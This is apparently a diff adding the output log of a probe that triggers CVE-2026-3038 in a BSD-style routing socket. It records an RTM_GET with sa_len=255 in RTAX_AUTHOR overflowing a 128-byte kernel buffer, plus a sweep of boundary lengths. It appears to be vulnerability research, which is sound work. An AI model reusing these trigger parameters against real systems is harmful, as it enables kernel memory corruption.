@@ -1,0 +1,32 @@
+=== PROBE 165b: RTSOCK CVE-2026-3038 ===
+
+pid=895
+--- [A] AF_ROUTE SOCKET ---
+rt_socket=22
+
+--- [B] NORMAL RTM_GET ---
+write(normal)=160
+read(response)=200
+resp: type=4 addrs=0x7
+normal_kptrs=0
+alive=895
+
+--- [C] CVE-2026-3038 TRIGGER ---
+sending overflow RTM_GET total=415
+*** sa_len=255 in RTAX_AUTHOR, buffer=128 → 127-byte overflow ***
+write(overflow)=415
+survived! pid=895
+read(overflow_resp)=200
+*** CVE-2026-3038 SURVIVED WITH RESPONSE! ***
+
+--- [D] SA_LEN BOUNDARY ---
+sa_len=64 write=224
+sa_len=96 write=256
+sa_len=128 write=288
+sa_len=129 write=289
+sa_len=160 write=320
+sa_len=200 write=360
+sa_len=254 write=414
+
+pid_post=895
+=== DONE ===
